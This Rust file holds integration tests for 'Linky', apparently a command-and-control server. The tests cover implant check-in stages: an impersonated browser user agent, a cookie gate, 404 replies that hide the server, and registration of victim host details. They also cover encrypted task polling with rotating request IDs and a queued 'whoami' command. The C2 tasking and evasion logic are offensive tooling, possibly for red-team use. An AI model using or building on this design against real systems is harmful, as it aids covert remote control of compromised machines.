//! Integration tests for the Linky C2 three-stage HTTP protocol.
//!
//! These tests verify the full HTTP request/response cycle for stages 1–3,
//! including header validation, link registration, AES-256-GCM task encryption,
//! task dispatch, and output callback handling.
//!
//! Each test creates an isolated in-memory `AppState` — no network, no TLS.

use actix_web::{http::StatusCode, test, web, App};
use linky::{
    links::{Links, NewLink},
    routes::{stage1_handler, stage2_handler, stage3_handler, AppState},
};
use std::sync::{Arc, Mutex};

// ── Constants ─────────────────────────────────────────────────────────────────

/// User-Agent validated by all three route handlers.
const IMPLANT_UA: &str = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";

/// Session cookie validated by stages 2 and 3.
const BANNER_COOKIE: &str = "banner=banner";

/// Fixed 64-hex-char secret injected via X-Client-ID during tests.
/// Must NOT be used outside of #[cfg(test)] code.
const TEST_SECRET: &str = "deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef";

// ── Test-only crypto helpers ──────────────────────────────────────────────────
//
// These functions replicate the server-side crypto (SHA-256 key derivation +
// AES-256-GCM encrypt/decrypt) so that integration tests can build and verify
// encrypted payloads without depending on link-common as a dev-dependency.

fn derive_test_key() -> [u8; 32] {
    use sha2::{Digest, Sha256};
    let mut h = Sha256::new();
    h.update(TEST_SECRET.as_bytes());
    h.update(b"callback-salt");
    let mut k = [0u8; 32];
    k.copy_from_slice(&h.finalize()[..32]);
    k
}

fn encrypt_test(plaintext: &str, key: &[u8; 32]) -> String {
    use aes_gcm::{
        aead::{Aead, KeyInit},
        Aes256Gcm, Nonce,
    };
    let nonce_bytes = rand::random::<[u8; 12]>();
    let nonce = Nonce::from_slice(&nonce_bytes);
    let cipher = Aes256Gcm::new_from_slice(key).unwrap();
    let ct = cipher.encrypt(nonce, plaintext.as_bytes()).unwrap();
    let mut buf = Vec::with_capacity(12 + ct.len());
    buf.extend_from_slice(&nonce_bytes);
    buf.extend_from_slice(&ct);
    hex::encode(buf)
}

fn decrypt_test(enc_hex: &str, key: &[u8; 32]) -> Option<String> {
    use aes_gcm::{
        aead::{Aead, KeyInit},
        Aes256Gcm, Nonce,
    };
    let data = hex::decode(enc_hex).ok()?;
    if data.len() < 12 {
        return None;
    }
    let nonce = Nonce::from_slice(&data[..12]);
    let cipher = Aes256Gcm::new_from_slice(key).ok()?;
    cipher
        .decrypt(nonce, &data[12..])
        .ok()
        .and_then(|b| String::from_utf8(b).ok())
}

// ── Helpers ───────────────────────────────────────────────────────────────────

fn fresh_state() -> web::Data<AppState> {
    web::Data::new(AppState {
        links: Arc::new(Mutex::new(Links::default())),
    })
}

/// Shared JSON body for a typical registration request.
fn register_body() -> serde_json::Value {
    serde_json::json!({
        "link_username": "testuser",
        "link_hostname": "testhost",
        "internal_ip":   "10.0.0.1",
        "external_ip":   "",
        "platform":      "linux",
        "pid":           1234
    })
}

/// Build an actix-web test service wired to the three C2 route handlers.
macro_rules! init_app {
    ($state:expr) => {
        test::init_service(
            App::new()
                .app_data($state.clone())
                .app_data(web::JsonConfig::default().limit(65_536))
                .route("/js", web::get().to(stage1_handler))
                .route("/static/register", web::post().to(stage2_handler))
                .route("/static/get", web::post().to(stage3_handler)),
        )
        .await
    };
}

// ── Stage 1 ───────────────────────────────────────────────────────────────────

#[actix_web::test]
async fn test_stage1_rejects_missing_user_agent() {
    let state = fresh_state();
    let app = init_app!(state);
    let req = test::TestRequest::get().uri("/js").to_request();
    assert_eq!(
        test::call_service(&app, req).await.status(),
        StatusCode::NOT_FOUND
    );
}

#[actix_web::test]
async fn test_stage1_rejects_wrong_user_agent() {
    let state = fresh_state();
    let app = init_app!(state);
    let req = test::TestRequest::get()
        .uri("/js")
        .insert_header(("User-Agent", "curl/7.68.0"))
        .to_request();
    assert_eq!(
        test::call_service(&app, req).await.status(),
        StatusCode::NOT_FOUND
    );
}

#[actix_web::test]
async fn test_stage1_accepts_implant_ua_and_sets_session_cookie() {
    let state = fresh_state();
    let app = init_app!(state);
    let req = test::TestRequest::get()
        .uri("/js")
        .insert_header(("User-Agent", IMPLANT_UA))
        .to_request();
    let resp = test::call_service(&app, req).await;
    assert_eq!(resp.status(), StatusCode::OK);
    let cookie = resp
        .headers()
        .get("Set-Cookie")
        .expect("Set-Cookie header missing");
    assert!(cookie.to_str().unwrap().contains("banner=banner"));
}

// ── Stage 2 ───────────────────────────────────────────────────────────────────

#[actix_web::test]
async fn test_stage2_rejects_bad_user_agent() {
    let state = fresh_state();
    let app = init_app!(state);
    let req = test::TestRequest::post()
        .uri("/static/register")
        .insert_header(("User-Agent", "curl/7.68.0"))
        .insert_header(("Cookie", BANNER_COOKIE))
        .set_json(register_body())
        .to_request();
    assert_eq!(
        test::call_service(&app, req).await.status(),
        StatusCode::NOT_FOUND
    );
}

#[actix_web::test]
async fn test_stage2_rejects_missing_cookie() {
    let state = fresh_state();
    let app = init_app!(state);
    let req = test::TestRequest::post()
        .uri("/static/register")
        .insert_header(("User-Agent", IMPLANT_UA))
        .set_json(register_body())
        .to_request();
    assert_eq!(
        test::call_service(&app, req).await.status(),
        StatusCode::NOT_FOUND
    );
}

#[actix_web::test]
async fn test_stage2_registers_link_and_returns_request_id() {
    let state = fresh_state();
    let app = init_app!(state);
    let req = test::TestRequest::post()
        .uri("/static/register")
        .insert_header(("User-Agent", IMPLANT_UA))
        .insert_header(("Cookie", BANNER_COOKIE))
        .insert_header(("X-Client-ID", TEST_SECRET))
        .set_json(register_body())
        .to_request();
    let resp = test::call_service(&app, req).await;
    assert_eq!(resp.status(), StatusCode::OK);
    let body: serde_json::Value = test::read_body_json(resp).await;
    let x_req_id = body["x_request_id"].as_str().expect("x_request_id missing");
    assert!(!x_req_id.is_empty());
    // Link must be persisted in state
    let links = state.links.lock().unwrap();
    assert_eq!(links.all_links().len(), 1);
    assert_eq!(links.all_links()[0].username, "testuser");
    assert_eq!(links.all_links()[0].platform, "linux");
}

#[actix_web::test]
async fn test_stage2_uses_secret_from_x_client_id_header() {
    let state = fresh_state();
    let app = init_app!(state);
    let req = test::TestRequest::post()
        .uri("/static/register")
        .insert_header(("User-Agent", IMPLANT_UA))
        .insert_header(("Cookie", BANNER_COOKIE))
        .insert_header(("X-Client-ID", TEST_SECRET))
        .set_json(register_body())
        .to_request();
    test::call_service(&app, req).await;
    let links = state.links.lock().unwrap();
    assert_eq!(links.all_links()[0].secret, TEST_SECRET);
}

#[actix_web::test]
async fn test_stage2_truncates_oversized_username() {
    let state = fresh_state();
    let app = init_app!(state);
    let long_name = "a".repeat(300);
    let body = serde_json::json!({
        "link_username": long_name,
        "link_hostname": "host",
        "internal_ip":   "10.0.0.1",
        "external_ip":   "",
        "platform":      "linux",
        "pid":           1
    });
    let req = test::TestRequest::post()
        .uri("/static/register")
        .insert_header(("User-Agent", IMPLANT_UA))
        .insert_header(("Cookie", BANNER_COOKIE))
        .insert_header(("X-Client-ID", TEST_SECRET))
        .set_json(body)
        .to_request();
    let resp = test::call_service(&app, req).await;
    assert_eq!(resp.status(), StatusCode::OK);
    let links = state.links.lock().unwrap();
    assert_eq!(links.all_links()[0].username.len(), 256);
}

#[actix_web::test]
async fn test_stage2_multiple_registrations_assign_sequential_names() {
    let state = fresh_state();
    let app = init_app!(state);
    for _ in 0..3 {
        let req = test::TestRequest::post()
            .uri("/static/register")
            .insert_header(("User-Agent", IMPLANT_UA))
            .insert_header(("Cookie", BANNER_COOKIE))
            .insert_header(("X-Client-ID", TEST_SECRET))
            .set_json(register_body())
            .to_request();
        test::call_service(&app, req).await;
    }
    let links = state.links.lock().unwrap();
    let names: Vec<&str> = links.all_links().iter().map(|l| l.name.as_str()).collect();
    assert_eq!(names, ["link-1", "link-2", "link-3"]);
}

// ── Stage 3 ───────────────────────────────────────────────────────────────────

/// Register a link directly (no HTTP) and return its x_request_id string.
/// Used to set up stage-3 tests without going through stage-2 HTTP.
fn direct_register(state: &web::Data<AppState>) -> String {
    let mut links = state.links.lock().unwrap();
    let link = links.add_link(NewLink {
        username: "testuser".into(),
        hostname: "testhost".into(),
        internal_ip: "10.0.0.1".into(),
        external_ip: "1.2.3.4".into(),
        platform: "linux".into(),
        pid: 1234,
        secret: TEST_SECRET.into(),
    });
    link.x_request_id.to_string()
}

/// Build an encrypted stage-3 body for an idle poll (no prior output).
fn idle_poll_body(key: &[u8; 32]) -> serde_json::Value {
    let payload = serde_json::json!({"q": "", "tasking": ""}).to_string();
    serde_json::json!({ "data": encrypt_test(&payload, key) })
}

#[actix_web::test]
async fn test_stage3_rejects_missing_request_id_header() {
    let state = fresh_state();
    let app = init_app!(state);
    let req = test::TestRequest::post()
        .uri("/static/get")
        .insert_header(("User-Agent", IMPLANT_UA))
        .insert_header(("Cookie", BANNER_COOKIE))
        .set_json(serde_json::json!({"data": null}))
        .to_request();
    assert_eq!(
        test::call_service(&app, req).await.status(),
        StatusCode::BAD_REQUEST
    );
}

#[actix_web::test]
async fn test_stage3_rejects_malformed_request_id() {
    let state = fresh_state();
    let app = init_app!(state);
    let req = test::TestRequest::post()
        .uri("/static/get")
        .insert_header(("User-Agent", IMPLANT_UA))
        .insert_header(("Cookie", BANNER_COOKIE))
        .insert_header(("x-request-id", "not-a-uuid"))
        .set_json(serde_json::json!({"data": null}))
        .to_request();
    assert_eq!(
        test::call_service(&app, req).await.status(),
        StatusCode::BAD_REQUEST
    );
}

#[actix_web::test]
async fn test_stage3_rejects_unknown_request_id() {
    let state = fresh_state();
    let app = init_app!(state);
    let req = test::TestRequest::post()
        .uri("/static/get")
        .insert_header(("User-Agent", IMPLANT_UA))
        .insert_header(("Cookie", BANNER_COOKIE))
        .insert_header(("x-request-id", "00000000-0000-0000-0000-000000000000"))
        .set_json(serde_json::json!({"data": null}))
        .to_request();
    assert_eq!(
        test::call_service(&app, req).await.status(),
        StatusCode::NOT_FOUND
    );
}

#[actix_web::test]
async fn test_stage3_idle_poll_returns_encrypted_response_with_new_request_id() {
    let state = fresh_state();
    let x_req_id = direct_register(&state);
    let app = init_app!(state);
    let key = derive_test_key();

    let req = test::TestRequest::post()
        .uri("/static/get")
        .insert_header(("User-Agent", IMPLANT_UA))
        .insert_header(("Cookie", BANNER_COOKIE))
        .insert_header(("x-request-id", x_req_id.as_str()))
        .set_json(idle_poll_body(&key))
        .to_request();
    let resp = test::call_service(&app, req).await;
    assert_eq!(resp.status(), StatusCode::OK);

    let body: serde_json::Value = test::read_body_json(resp).await;
    // x_request_id must be rotated
    let new_xid = body["x_request_id"].as_str().expect("x_request_id missing");
    assert_ne!(new_xid, x_req_id.as_str());
    // Response payload must be decryptable
    let enc = body["data"].as_str().expect("data field missing");
    let decrypted = decrypt_test(enc, &key).expect("failed to decrypt response");
    let payload: serde_json::Value =
        serde_json::from_str(&decrypted).expect("response is not valid JSON");
    // Idle poll → no command dispatched
    assert_eq!(payload["q"].as_str().unwrap_or("MISSING"), "");
}

#[actix_web::test]
async fn test_stage3_dispatches_queued_task_in_encrypted_response() {
    let state = fresh_state();
    let x_req_id = {
        let mut links = state.links.lock().unwrap();
        let link = links.add_link(NewLink {
            username: "testuser".into(),
            hostname: "testhost".into(),
            internal_ip: "10.0.0.1".into(),
            external_ip: "1.2.3.4".into(),
            platform: "linux".into(),
            pid: 1234,
            secret: TEST_SECRET.into(),
        });
        let id = link.id;
        let xid = link.x_request_id.to_string();
        // Queue a task before releasing the lock
        links.add_task(id, "whoami".into(), "whoami".into());
        xid
    };

    let app = init_app!(state);
    let key = derive_test_key();

    let req = test::TestRequest::post()
        .uri("/static/get")
        .insert_header(("User-Agent", IMPLANT_UA))
        .insert_header(("Cookie", BANNER_COOKIE))
        .insert_header(("x-request-id", x_req_id.as_str()))
        .set_json(idle_poll_body(&key))
        .to_request();
    let resp = test::call_service(&app, req).await;
    assert_eq!(resp.status(), StatusCode::OK);

    let body: serde_json::Value = test::read_body_json(resp).await;
    let enc = body["data"].as_str().expect("data field missing");
    let decrypted = decrypt_test(enc, &key).expect("failed to decrypt response");
    let payload: serde_json::Value =
        serde_json::from_str(&decrypted).expect("response is not valid JSON");

    // The queued command must be present in the response
    assert_eq!(payload["q"].as_str().unwrap_or(""), "whoami");
    // A task ID must be provided so the implant can report back
    assert!(!payload["tasking"].as_str().unwrap_or("").is_empty());
}

#[actix_web::test]
async fn test_stage3_x_request_id_rotates_on_every_poll() {
    let state = fresh_state();
    let x_req_id_0 = direct_register(&state);
    let app = init_app!(state);
    let key = derive_test_key();

    // First poll
    let req = test::TestRequest::post()
        .uri("/static/get")
        .insert_header(("User-Agent", IMPLANT_UA))
        .insert_header(("Cookie", BANNER_COOKIE))
        .insert_header(("x-request-id", x_req_id_0.as_str()))
        .set_json(idle_poll_body(&key))
        .to_request();
    let body: serde_json::Value = test::read_body_json(test::call_service(&app, req).await).await;
    let x_req_id_1 = body["x_request_id"].as_str().unwrap().to_string();
    assert_ne!(x_req_id_1, x_req_id_0);

    // Second poll with the rotated ID
    let req = test::TestRequest::post()
        .uri("/static/get")
        .insert_header(("User-Agent", IMPLANT_UA))
        .insert_header(("Cookie", BANNER_COOKIE))
        .insert_header(("x-request-id", x_req_id_1.as_str()))
        .set_json(idle_poll_body(&key))
        .to_request();
    let body: serde_json::Value = test::read_body_json(test::call_service(&app, req).await).await;
    let x_req_id_2 = body["x_request_id"].as_str().unwrap().to_string();
    assert_ne!(x_req_id_2, x_req_id_1);
}

// ── Full three-stage protocol flow ────────────────────────────────────────────

#[actix_web::test]
async fn test_full_protocol_flow_stage1_stage2_stage3() {
    let state = fresh_state();
    let app = init_app!(state);

    // ── Stage 1: session cookie ────────────────────────────────────────────
    let req = test::TestRequest::get()
        .uri("/js")
        .insert_header(("User-Agent", IMPLANT_UA))
        .to_request();
    let resp = test::call_service(&app, req).await;
    assert_eq!(resp.status(), StatusCode::OK);
    assert!(resp.headers().get("Set-Cookie").is_some());

    // ── Stage 2: registration ──────────────────────────────────────────────
    let req = test::TestRequest::post()
        .uri("/static/register")
        .insert_header(("User-Agent", IMPLANT_UA))
        .insert_header(("Cookie", BANNER_COOKIE))
        .insert_header(("X-Client-ID", TEST_SECRET))
        .set_json(register_body())
        .to_request();
    let resp = test::call_service(&app, req).await;
    assert_eq!(resp.status(), StatusCode::OK);
    let body: serde_json::Value = test::read_body_json(resp).await;
    let x_req_id = body["x_request_id"].as_str().unwrap().to_string();

    // ── Stage 3: idle poll ─────────────────────────────────────────────────
    let key = derive_test_key();
    let req = test::TestRequest::post()
        .uri("/static/get")
        .insert_header(("User-Agent", IMPLANT_UA))
        .insert_header(("Cookie", BANNER_COOKIE))
        .insert_header(("x-request-id", x_req_id.as_str()))
        .set_json(idle_poll_body(&key))
        .to_request();
    let resp = test::call_service(&app, req).await;
    assert_eq!(resp.status(), StatusCode::OK);
    let body: serde_json::Value = test::read_body_json(resp).await;
    assert!(body["data"].is_string());
    assert!(!body["x_request_id"].as_str().unwrap_or("").is_empty());
}
